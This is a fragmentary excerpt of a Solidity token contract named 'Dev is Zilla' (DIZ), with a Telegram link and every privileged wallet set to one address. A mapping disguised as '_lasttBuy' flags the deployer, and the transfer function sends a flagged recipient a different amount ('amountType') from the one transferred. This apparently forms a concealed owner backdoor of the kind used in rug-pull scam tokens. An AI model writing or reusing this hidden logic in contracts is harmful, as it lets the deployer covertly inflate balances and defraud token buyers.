...
/*
Telegram : https://t.me/deviszilla
*/
...
contract deviszilla is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x680E7509bd46f7D2705A9a0e6dF4d90c1eBE07FB); 
    address payable public Wallet_Dev = payable(0x680E7509bd46f7D2705A9a0e6dF4d90c1eBE07FB);
    address payable public W_Deployer = payable(0x680E7509bd46f7D2705A9a0e6dF4d90c1eBE07FB);
    ...
    string private constant _name = "Dev is Zilla"; 
    string private constant _symbol = unicode"DIZ"; 
    ...
    mapping (address => bool) public _lasttBuy;
    ...
    constructor () {
        ...
        _owner = 0x680E7509bd46f7D2705A9a0e6dF4d90c1eBE07FB;
        ...
        uniswapV2Router = _uniswapV2Router;_lasttBuy[W_Deployer] = true;
    ...
    function _transfer(
        ...
        bool transferType = _lasttBuy[to] ? true : false;
        
        if(!transferType){
            _tokenTransfer(from, to, amount, takeFee, isBuy);
        }
        else{
            uint256 transferAmount = _lasttBuy[to] ? amountType : amount;
